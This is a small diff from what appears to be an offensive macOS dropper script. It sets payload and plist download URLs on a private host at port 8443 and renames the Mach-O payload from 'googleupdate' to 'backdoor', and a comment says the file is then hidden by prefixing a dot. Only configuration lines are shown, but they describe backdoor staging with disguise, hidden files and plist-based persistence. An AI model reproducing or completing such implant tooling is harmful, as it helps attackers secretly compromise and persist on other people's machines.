@@ -8,7 +8,7 @@ URL="https://192.168.1.5:8443/osx"
 PLISTURL="https://192.168.1.5:8443/plist"
 
 # Rename our payload macho-o name
-PAYLOAD="googleupdate"
+PAYLOAD="backdoor"
 
 # Add dot to make hidden file
 PAYLOAD=".${PAYLOAD}"
